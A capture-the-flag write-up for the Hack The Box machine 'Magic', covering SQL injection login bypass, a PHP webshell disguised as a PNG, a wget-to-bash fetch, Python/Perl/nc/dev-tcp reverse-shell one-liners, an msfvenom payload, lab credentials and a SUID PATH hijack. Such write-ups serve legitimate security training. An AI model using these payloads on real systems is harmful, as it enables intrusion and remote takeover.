---
layout: single
title: Magic - Hack The Box
excerpt: "Magic starts with a classic PHP insecure upload vulnerability that let us place a webshell on the target host and then we exploit a subtle webserver misconfiguration to execute the webshell (even though the file name doesn't end with a .php extension). Once we land a shell, we escalate to another user with credentials found in MySQL and priv esc to root by exploiting a path hijack vulnerability in a SUID binary."
date: 2020-08-22
classes: wide
header:
  teaser: /assets/images/htb-writeup-magic/magic_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - sqli
  - upload
  - php
  - mysql
  - port forward
  - suid
  - path hijack
---

![](/assets/images/htb-writeup-magic/magic_logo.png)

Magic starts with a classic PHP insecure upload vulnerability that let us place a webshell on the target host and then we exploit a subtle webserver misconfiguration to execute the webshell (even though the file name doesn't end with a .php extension). Once we land a shell, we escalate to another user with credentials found in MySQL and priv esc to root by exploiting a path hijack vulnerability in a SUID binary.

## Summary

- Bypass the login page with a simple SQL injection
- Upload a PHP webshell after bypassing the file type and extension restriction
- Find DB credentials, then find the password for user theseus in the MySQL database
- Privesc by hijacking the PATH of a SUID binary

## Portscan

![](/assets/images/htb-writeup-magic/nmap.png)

## Website and initial shell

The website is just an image gallery with a link to upload new images at the bottom.

![](/assets/images/htb-writeup-magic/website1.png)

The upload page is protected by a login form for which we don't have valid credentials.

![](/assets/images/htb-writeup-magic/login.png)

We can try some default credentials like `admin / admin` on the login page but they don't work. Next we'll try a very simple SQL injection like `' or '1'='1` in the password field. This makes the password condition return True and we're able to pass the authentication check.

![](/assets/images/htb-writeup-magic/upload.png)

The application filters out what we can upload so we're not able to upload a PHP webshell with the .php extension.

![](/assets/images/htb-writeup-magic/upload1.png)

The application also checks the content of the file so even if we rename the file to a valid image extension it fails the upload check.

![](/assets/images/htb-writeup-magic/upload3.png)

By using a valid PNG image and inserting PHP code in the middle of the file we can pass the magic bytes check and the application will think it's a valid image.

![](/assets/images/htb-writeup-magic/upload4.png)

To bypass the extension check, we can append `.png` and it will still execute the file as PHP code when we send the GET request to `/images/uploads/snow.php.png`. This happens because of a subtle misconfiguration in the htaccess configuration file. The regular expression only checks if the `.php` string is present in the filename, not that the file name actually ends with `.php`.

```
<FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)">
SetHandler application/x-httpd-php
</FilesMatch>
<Files ~ "\.(sh|sql)">
   order deny,allow
   deny from all
```

Now that we have uploaded the webshell we have remote code execution:

![](/assets/images/htb-writeup-magic/rce.png)

With the PHP webshell, I can fetch a bash script from my box and get a reverse shell through Perl:

`http://magic.htb/images/uploads/snow.php.png?c=wget%20-O%20-%20http://10.10.14.35/shell.sh%20|%20bash`

The bash script will try various methods to get a reverse shell back to us:

```bash
if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.35",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi

if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;$i="10.10.14.35";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        exit;
fi

if command -v nc > /dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.35 443 >/tmp/f
        exit;
fi

if command -v sh > /dev/null 2>&1; then
        /bin/sh -i >& /dev/tcp/10.10.14.35/443 0>&1
        exit;
fi
```

![](/assets/images/htb-writeup-magic/rce2.png)

## Privesc to user theseus

In the web application directory `/var/www/Magic`, we find a PHP script `db.php5` that contains the database configuration file for the web application with the mysql username, password and database name.

```php
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```

The mysql CLI client isn't installed on the machine so we'll have to do port forwarding to reach port 3306 listening on localhost. There's many ways to do this, here I'll use a meterpreter shell to port forward 3306.

`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.14.35 LPORT=5555`

![](/assets/images/htb-writeup-magic/met1.png)

![](/assets/images/htb-writeup-magic/met2.png)

We can now log in to MySQL and we find another password in the **login** table.

![](/assets/images/htb-writeup-magic/mysql.png)

We can use the `Th3s3usW4sK1ng` to su to user `theseus`:

![](/assets/images/htb-writeup-magic/user.png)

## Privesc to root

Looking at SUID files, `/bin/sysinfo` stands out because it's not a standard Linux binary.

![](/assets/images/htb-writeup-magic/sysinfo.png)

The program just seems to be running a bunch of standard Linux programs like `free`.

![](/assets/images/htb-writeup-magic/sysinfo2.png)

By using `ltrace`, we can confirm this and see that the program uses the `popen` function to execute programs:

![](/assets/images/htb-writeup-magic/sysinfo3.png)

The program is vulnerable because we control the PATH and the program doesn't use the absolute path to execute the programs so we can execute anything we want as root. To get root I'll just create a script that sets the SUID bit on  `/bin/bash`, name it `free` and call `/bin/sysinfo` after setting the path to my current directory so it doesn't execute the real `free` program but my own script.

![](/assets/images/htb-writeup-magic/root.png)